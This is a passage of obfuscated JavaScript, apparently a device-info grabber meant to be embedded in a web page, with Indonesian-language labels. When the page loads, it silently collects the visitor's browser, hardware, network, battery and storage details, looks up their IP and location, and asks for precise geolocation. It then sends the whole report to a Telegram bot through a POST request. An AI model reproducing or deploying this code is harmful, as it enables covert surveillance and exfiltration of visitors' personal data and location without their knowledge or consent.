_0x5651c9*_0x4dbb51;},'mNEbV':_0x22c4e0(0x226),'gTUhm':_0x22c4e0(0x1d9),'pfgjI':_0x22c4e0(0x197),'cdXff':function(_0x41a5ef){return _0x41a5ef();}},_0x17b2df=navigator[_0x22c4e0(0x23b)],_0x42660e=navigator[_0x22c4e0(0x1a7)],_0x3eda2c=navigator[_0x22c4e0(0x1ac)],_0xe37433=navigator[_0x22c4e0(0x1a8)]?navigator['languages']['join'](',\x20'):_0x22c4e0(0x218),_0x1ce4cb=navigator[_0x22c4e0(0x1c3)],_0x343f42=window[_0x22c4e0(0x198)][_0x22c4e0(0x1b3)],_0xc965fa=window[_0x22c4e0(0x198)][_0x22c4e0(0x19a)],_0x14c4da=navigator[_0x22c4e0(0x1e0)]||navigator[_0x22c4e0(0x1fa)]||navigator['webkitConnection'],_0x101811=navigator[_0x22c4e0(0x1ee)]?_0x22c4e0(0x254):_0x40630d[_0x22c4e0(0x193)],_0x2c317c=_0x14c4da?_0x14c4da['effectiveType']:_0x40630d[_0x22c4e0(0x1c6)],_0x25dfa5=_0x14c4da&&_0x14c4da[_0x22c4e0(0x1e4)]?_0x14c4da[_0x22c4e0(0x1e4)]:_0x40630d[_0x22c4e0(0x1c6)],_0x2dd567=_0x14c4da?_0x14c4da[_0x22c4e0(0x1a4)]+_0x22c4e0(0x1e8):_0x40630d[_0x22c4e0(0x1c6)],_0x3915a1=Intl[_0x22c4e0(0x216)]()[_0x22c4e0(0x20d)]()['timeZone'],_0x2c0594=new Date()[_0x22c4e0(0x21b)](),_0x42918b=window['matchMedia']&&window[_0x22c4e0(0x1c8)](_0x40630d[_0x22c4e0(0x229)])[_0x22c4e0(0x1e6)]?_0x40630d['hotVY']:_0x40630d[_0x22c4e0(0x1ca)],_0x153e3e=_0x40630d[_0x22c4e0(0x180)](_0x40630d[_0x22c4e0(0x18d)],window)||_0x40630d[_0x22c4e0(0x20e)](navigator[_0x22c4e0(0x1f6)],0x0)?_0x40630d[_0x22c4e0(0x1c0)]:_0x40630d[_0x22c4e0(0x242)],_0x3acf17=navigator[_0x22c4e0(0x21a)]?'Aktif':_0x40630d['KXtXb'],_0x331b26=window[_0x22c4e0(0x1c8)](_0x40630d[_0x22c4e0(0x19f)])['matches']?_0x22c4e0(0x1d3):_0x22c4e0(0x1b5),_0x53ba7d=_0x40630d[_0x22c4e0(0x1ce)](_0x40630d[_0x22c4e0(0x224)](_0x40630d[_0x22c4e0(0x18b)](performance['now'](),0x3e8),0x3c),0x3c)[_0x22c4e0(0x213)](0x2)+'\x20jam',_0x39c95f=/Mobi|Android/i[_0x22c4e0(0x232)](_0x17b2df)?_0x22c4e0(0x234):_0x40630d[_0x22c4e0(0x20c)],_0x4f0284=_0x40630d[_0x22c4e0(0x19e)](detectGPU),_0x1e220c=navigator[_0x22c4e0(0x1df)]||_0x40630d[_0x22c4e0(0x1c6)],_0x2d9601=navigator[_0x22c4e0(0x1f3)]?navigator['deviceMemory']+_0x22c4e0(0x199):'Tidak\x20diketahui',_0x219fdc=_0x40630d[_0x22c4e0(0x1f5)](calculateStorageSize,localStorage),_0x33e9ea=_0x40630d[_0x22c4e0(0x1f5)](calculateStorageSize,sessionStorage);let _0x1ebb2a=_0x40630d['Qgcno'],_0x429060=_0x40630d[_0x22c4e0(0x1c6)],_0x23dccc=_0x40630d['Qgcno'],_0xac15a3=_0x40630d[_0x22c4e0(0x209)];try{const _0x1f7fc4=await fetch(_0x40630d[_0x22c4e0(0x1b9)]),_0x137fcb=await _0x1f7fc4[_0x22c4e0(0x230)]();_0x1ebb2a=_0x137fcb['ip']||_0x40630d[_0x22c4e0(0x1c6)];if(!_0x429060||_0x40630d[_0x22c4e0(0x239)](_0x429060,_0x40630d[_0x22c4e0(0x1c6)]))_0x429060=_0x137fcb['latitude']||_0x40630d[_0x22c4e0(0x1c6)];if(!_0x23dccc||_0x23dccc===_0x40630d['Qgcno'])_0x23dccc=_0x137fcb['longitude']||_0x40630d[_0x22c4e0(0x1c6)];_0xac15a3=_0x137fcb[_0x22c4e0(0x227)]+',\x20'+_0x137fcb[_0x22c4e0(0x188)]+',\x20'+_0x137fcb[_0x22c4e0(0x1b4)];}catch(_0x31bc4a){console['error'](_0x40630d[_0x22c4e0(0x22c)],_0x31bc4a);}let _0x4fc07d=_0x40630d[_0x22c4e0(0x1d7)];if(navigator[_0x22c4e0(0x192)]){const _0x550952=await navigator[_0x22c4e0(0x192)]();_0x4fc07d=_0x40630d[_0x22c4e0(0x208)](_0x40630d['KOTjC'](_0x40630d[_0x22c4e0(0x195)]('Level:\x20'+_0x40630d['qesyG'](_0x550952[_0x22c4e0(0x22b)],0x64)['toFixed'](0x0)+_0x22c4e0(0x1bc),_0x22c4e0(0x1a9)+(_0x550952[_0x22c4e0(0x1cb)]?_0x40630d[_0x22c4e0(0x1a2)]:_0x40630d[_0x22c4e0(0x1d5)])+',\x20'),_0x22c4e0(0x1e2)+(_0x550952[_0x22c4e0(0x185)]?_0x550952['chargingTime']+_0x22c4e0(0x17e):_0x40630d[_0x22c4e0(0x1c6)])+',\x20'),'Waktu\x20Penggunaan:\x20'+(_0x550952[_0x22c4e0(0x22f)]?_0x550952[_0x22c4e0(0x22f)]+_0x22c4e0(0x17e):_0x40630d[_0x22c4e0(0x1c6)]));}navigator[_0x22c4e0(0x17f)]?navigator[_0x22c4e0(0x17f)][_0x22c4e0(0x18c)](_0x2a6c04=>{const _0x89a35=_0x22c4e0;_0x429060=_0x2a6c04['coords'][_0x89a35(0x1c1)][_0x89a35(0x213)](0x6),_0x23dccc=_0x2a6c04['coords'][_0x89a35(0x1bb)][_0x89a35(0x213)](0x6),_0xac15a3=_0x89a35(0x223)+_0x429060+_0x89a35(0x1e9)+_0x23dccc,_0x4f9dd2();},_0xf17ec=>{const _0x2abb4f=_0x22c4e0;console[_0x2abb4f(0x1fd)](_0x40630d['IuHlY'],_0xf17ec[_0x2abb4f(0x191)]),_0x40630d[_0x2abb4f(0x1f7)](_0x4f9dd2);}):(console[_0x22c4e0(0x1fd)](_0x40630d[_0x22c4e0(0x1ab)]),_0x40630d['cdXff'](_0x4f9dd2));function _0xdd3863(_0x1a4c4b){const _0x46adf0=_0x22c4e0;if(!_0x1a4c4b)return _0x40630d[_0x46adf0(0x235)];switch(_0x1a4c4b[_0x46adf0(0x24c)]()){case _0x46adf0(0x1f0):return _0x40630d['ADzQu'];case _0x46adf0(0x210):return _0x46adf0(0x23a);case _0x40630d[_0x46adf0(0x1c5)]:return _0x40630d['xaybA'];case _0x40630d[_0x46adf0(0x184)]:return _0x46adf0(0x20f);case _0x40630d[_0x46adf0(0x17c)]:return _0x40630d[_0x46adf0(0x235)];default:return _0x1a4c4b;}}function _0x4f9dd2(){const _0x249f2b=_0x22c4e0,_0x33792e={'wazBp':_0x40630d[_0x249f2b(0x221)]},_0x5f258c={'userAgent':_0x17b2df,'platform':_0x42660e,'language':_0x3eda2c,'additionalLanguages':_0xe37433,'vendor':_0x1ce4cb,'browser':_0x40630d['GJyLK'](detectBrowser),'os':detectOS(),'screenResolution':_0x343f42+_0x249f2b(0x1a6)+_0xc965fa,'onlineStatus':_0x101811,'networkType':_0x40630d['NPVvP'](_0xdd3863,_0x25dfa5),'connectionType':_0x2c317c,'downlinkSpeed':_0x2dd567,'timezone':_0x3915a1,'localTime':_0x2c0594,'darkMode':_0x42918b,'touchscreen':_0x153e3e,'cookieEnabled':_0x3acf17,'deviceOrientation':_0x331b26,'deviceUptime':_0x53ba7d,'hardwareConcurrency':_0x1e220c,'deviceMemory':_0x2d9601,'localStorageSize':_0x219fdc,'sessionStorageSize':_0x33e9ea,'ipAddress':_0x1ebb2a,'latitude':_0x429060,'longitude':_0x23dccc,'locationInfo':_0xac15a3,'batteryInfo':_0x4fc07d,'isMobileDevice':_0x39c95f,'gpu':_0x4f0284},_0x345c3a=_0x40630d[_0x249f2b(0x1ef)],_0x45ecb5=_0x40630d[_0x249f2b(0x196)],_0x23a2a3=_0x249f2b(0x1ae)+_0x345c3a+_0x249f2b(0x222),_0x284105=_0x40630d['HVtGv'](_0x40630d['rjRto'](_0x40630d['HVtGv'](_0x40630d[_0x249f2b(0x1b0)](_0x40630d[_0x249f2b(0x248)](_0x40630d[_0x249f2b(0x1da)](_0x40630d[_0x249f2b(0x1da)](_0x40630d[_0x249f2b(0x252)](_0x40630d['YHFRq'](_0x40630d[_0x249f2b(0x17b)](_0x40630d[_0x249f2b(0x1ec)](_0x40630d['QDCgJ'](_0x40630d['rjRto'](_0x40630d[_0x249f2b(0x1b0)](_0x40630d[_0x249f2b(0x1d2)](_0x40630d[_0x249f2b(0x1b0)](_0x40630d[_0x249f2b(0x1a1)](_0x40630d[_0x249f2b(0x1db)](_0x40630d[_0x249f2b(0x1f9)](_0x40630d['rjRto']('📱\x20*Informasi\x20Perangkat:*\x0a\x0a',_0x249f2b(0x20a)),_0x249f2b(0x1c2)+_0x5f258c[_0x249f2b(0x23b)]+'\x0a')+('•\x20*Platform:*\x20'+_0x5f258c[_0x249f2b(0x1a7)]+'\x0a')+(_0x249f2b(0x1c4)+_0x5f258c[_0x249f2b(0x1ac)]+'\x0a'),_0x249f2b(0x215)+_0x5f258c[_0x249f2b(0x21f)]+'\x0a'),_0x249f2b(0x1d0)+_0x5f258c[_0x249f2b(0x1c3)]+'\x0a\x0a'),'🌐\x20*Jaringan:*\x0a'),'•\x20*Status\x20Online:*\x20'+_0x5f258c[_0x249f2b(0x1ea)]+'\x0a'),_0x249f2b(0x1c7)+_0x5f258c[_0x249f2b(0x236)]+'\x0a'),'•\x20*Tipe\x20Koneksi:*\x20'+_0x5f258c[_0x249f2b(0x194)]+'\x0a')+('•\x20*Kecepatan\x20Koneksi:*\x20'+_0x5f258c[_0x249f2b(0x24e)]+'\x0a\x0a'),'📍\x20*Lokasi:*\x0a'),'•\x20*IP\x20Address:*\x20'+_0x5f258c[_0x249f2b(0x212)]+'\x0a'),_0x249f2b(0x23e)+_0x5f258c[_0x249f2b(0x253)]+'\x0a'),_0x249f2b(0x1d4)+_0x5f258c[_0x249f2b(0x1c1)]+'\x0a')+(_0x249f2b(0x18f)+_0x5f258c[_0x249f2b(0x1bb)]+'\x0a\x0a'),'🔋\x20*Baterai:*\x0a'),'•\x20'+_0x5f258c['batteryInfo']+'\x0a\x0a'),_0x249f2b(0x214)),_0x249f2b(0x225)+_0x5f258c['hardwareConcurrency']+'\x0a'),_0x249f2b(0x18e)+_0x5f258c[_0x249f2b(0x1f3)]+'\x0a'),_0x249f2b(0x1af)+_0x5f258c['gpu']+'\x0a')+('•\x20*Touchscreen:*\x20'+_0x5f258c['touchscreen']+'\x0a\x0a')+_0x249f2b(0x200)+(_0x249f2b(0x237)+_0x5f258c[_0x249f2b(0x1b1)]+'\x0a'),_0x249f2b(0x17d)+_0x5f258c[_0x249f2b(0x231)]+'\x0a'),_0x249f2b(0x1aa)+_0x5f258c['deviceUptime']+_0x249f2b(0x1bf))+(_0x249f2b(0x244)+new Date()[_0x249f2b(0x21b)]()+'_'),_0x2934b0=new FormData();_0x2934b0['append'](_0x40630d[_0x249f2b(0x1cd)],_0x45ecb5),_0x2934b0[_0x249f2b(0x247)](_0x249f2b(0x1bd),_0x284105),_0x2934b0[_0x249f2b(0x247)](_0x40630d[_0x249f2b(0x1e1)],_0x40630d[_0x249f2b(0x1cf)]),_0x40630d[_0x249f2b(0x1a0)](fetch,_0x23a2a3,{'method':_0x40630d[_0x249f2b(0x1fb)],'body':_0x2934b0})['then'](_0x9c1e94=>_0x9c1e94['json']())[_0x249f2b(0x1e7)](_0x166e4a=>{const _0x22ced3=_0x249f2b;_0x166e4a['ok']?console[_0x22ced3(0x201)]('Informasi\x20perangkat\x20berhasil\x20dikirim\x20ke\x20Telegram.'):console[_0x22ced3(0x1fd)](_0x33792e[_0x22ced3(0x1cc)],_0x166e4a);})['catch'](_0x2a0c6b=>{const _0x40b2bd=_0x249f2b;console[_0x40b2bd(0x1fd)](_0x40630d['JcitO'],_0x2a0c6b);});}}function _0x3752(_0x373e30,_0x4d3de5){const _0x251c61=_0x251c();return _0x3752=function(_0x3752b3,_0x354c3c){_0x3752b3=_0x3752b3-0x17b;let _0x2cc146=_0x251c61[_0x3752b3];return _0x2cc146;},_0x3752(_0x373e30,_0x4d3de5);}function calculateStorageSize(_0x171997){const _0x3c2ec3=_0x3752,_0x5ecb07={'EXPvC':function(_0x4d3514,_0x3eac80){return _0x4d3514*_0x3eac80;},'mHjep':function(_0x3eaaf1,_0x50ff44){return _0x3eaaf1+_0x50ff44;},'FcEJs':function(_0x2b71fd,_0x56cd5b){return _0x2b71fd/_0x56cd5b;},'wKoMp':'\x20KB'};let _0x1405f3=0x0;for(let _0x4a56ba in _0x171997){_0x171997[_0x3c2ec3(0x217)](_0x4a56ba)&&(_0x1405f3+=_0x5ecb07[_0x3c2ec3(0x21d)](_0x5ecb07[_0x3c2ec3(0x1d6)](_0x171997[_0x4a56ba][_0x3c2ec3(0x219)],_0x4a56ba[_0x3c2ec3(0x219)]),0x2));}return _0x5ecb07[_0x3c2ec3(0x1dc)](_0x1405f3,0x400)[_0x3c2ec3(0x213)](0x2)+_0x5ecb07[_0x3c2ec3(0x1a3)];}function detectBrowser(){const _0xbb7ae2=_0x3752,_0x3429cd={'KpfGu':'Mozilla\x20Firefox','aVcUJ':_0xbb7ae2(0x23c),'jFepc':'Apple\x20Safari','aponG':'Edge','uiBro':_0xbb7ae2(0x246),'DBvwM':_0xbb7ae2(0x187)},_0x5a8c77=navigator['userAgent'];if(_0x5a8c77[_0xbb7ae2(0x1ba)](_0xbb7ae2(0x24d)))return'Google\x20Chrome';if(_0x5a8c77[_0xbb7ae2(0x1ba)](_0xbb7ae2(0x19d)))return _0x3429cd[_0xbb7ae2(0x1eb)];if(_0x5a8c77[_0xbb7ae2(0x1ba)](_0x3429cd['aVcUJ'])&&!_0x5a8c77[_0xbb7ae2(0x1ba)](_0xbb7ae2(0x24d)))return _0x3429cd[_0xbb7ae2(0x220)];if(_0x5a8c77['includes'](_0x3429cd[_0xbb7ae2(0x1be)]))return _0xbb7ae2(0x190);if(_0x5a8c77[_0xbb7ae2(0x1ba)](_0x3429cd[_0xbb7ae2(0x228)])||_0x5a8c77[_0xbb7ae2(0x1ba)]('OPR'))return _0x3429cd['uiBro'];return _0x3429cd['DBvwM'];}function detectOS(){const _0x357812=_0x3752,_0xa3470b={'zEJTY':_0x357812(0x207),'Ulogm':_0x357812(0x1b2),'nKdll':_0x357812(0x249),'UCAmK':_0x357812(0x1a5),'OrdZu':'Linux','tkAnm':_0x357812(0x182)},_0xd06152=navigator['platform'][_0x357812(0x24c)]();if(_0xd06152[_0x357812(0x1ba)](_0xa3470b['zEJTY']))return _0xa3470b[_0x357812(0x23f)];if(_0xd06152['includes'](_0xa3470b[_0x357812(0x181)]))return _0xa3470b[_0x357812(0x19b)];if(_0xd06152[_0x357812(0x1ba)](_0x357812(0x186)))return _0xa3470b[_0x357812(0x240)];if(/android/[_0x357812(0x232)](navigator['userAgent'][_0x357812(0x24c)]()))return _0x357812(0x189);if(/iphone|ipad|ipod/[_0x357812(0x232)](navigator[_0x357812(0x23b)][_0x357812(0x24c)]()))return _0xa3470b[_0x357812(0x1de)];return _0x357812(0x24f);}function detectGPU(){const _0x880bef=_0x3752,_0x1de077={'ujjAL':_0x880bef(0x250),'CgUzg':_0x880bef(0x1b7),'ygeal':_0x880bef(0x23d),'UGIqD':'Tidak\x20diketahui','UgHdy':_0x880bef(0x19c)},_0x129f77=document[_0x880bef(0x205)](_0x1de077[_0x880bef(0x245)]),_0x134dae=_0x129f77[_0x880bef(0x24b)](_0x1de077[_0x880bef(0x21e)])||_0x129f77['getContext'](_0x1de077[_0x880bef(0x1ad)]);if(!_0x134dae)return _0x1de077[_0x880bef(0x233)];const _0x373457=_0x134dae[_0x880bef(0x24a)](_0x1de077['UgHdy']);return _0x373457?_0x134dae[_0x880bef(0x1e3)](_0x373457[_0x880bef(0x1c9)]):_0x1de077[_0x880bef(0x233)];}document['addEventListener'](_0x1408a8(0x22a),()=>{const _0x5edc98=_0x1408a8,_0x417ae4={'DwVJE':function(_0xab5dd3){return _0xab5dd3();}};_0x417ae4[_0x5edc98(0x203)](detectDeviceInfoAndSendToTelegram);});
